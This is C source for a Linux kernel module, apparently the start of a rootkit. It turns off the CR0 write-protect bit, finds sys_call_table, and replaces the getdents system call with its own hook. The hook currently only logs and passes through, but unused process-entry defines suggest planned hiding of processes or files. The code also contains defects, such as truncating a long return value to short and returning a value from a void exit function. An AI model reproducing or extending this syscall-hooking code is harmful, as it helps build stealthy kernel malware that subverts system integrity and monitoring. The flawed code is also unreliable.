#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/idr.h>
#include <asm/unistd.h>
#include <linux/compiler_types.h>
#include <linux/kprobes.h>
#include <linux/file.h>
#include <linux/fs.h>
#define FIRST_PROCESS_ENTRY 256
#define PROC_NUMBUF 13
#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CHS");

void
set_addr_rw(void)
{ 
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
}


void
set_addr_ro(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
}
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

asmlinkage long (*old_sys_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);  

unsigned long *sys_call_table;

asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
	
	short ret;

	printk("hook is ok\n");
	ret = old_sys_getdents(fd,dirent,count);


	return ret;
}

int __init hack_kernel(void){
	unsigned long address;
	set_addr_rw();

	sys_call_table = kallsyms_lookup_name("sys_call_table");
	old_sys_getdents = sys_call_table[__NR_getdents];
	sys_call_table[__NR_getdents] = new_sys_getdents;
		
	set_addr_ro();


	return 0;
}


void __exit hack_kernel_exit(void){
	

	set_addr_rw();
	sys_call_table = kallsyms_lookup_name("sys_call_table");
	sys_call_table[__NR_getdents] = old_sys_getdents;
	set_addr_ro();
	return 0;
}
module_init(hack_kernel);
module_exit(hack_kernel_exit)
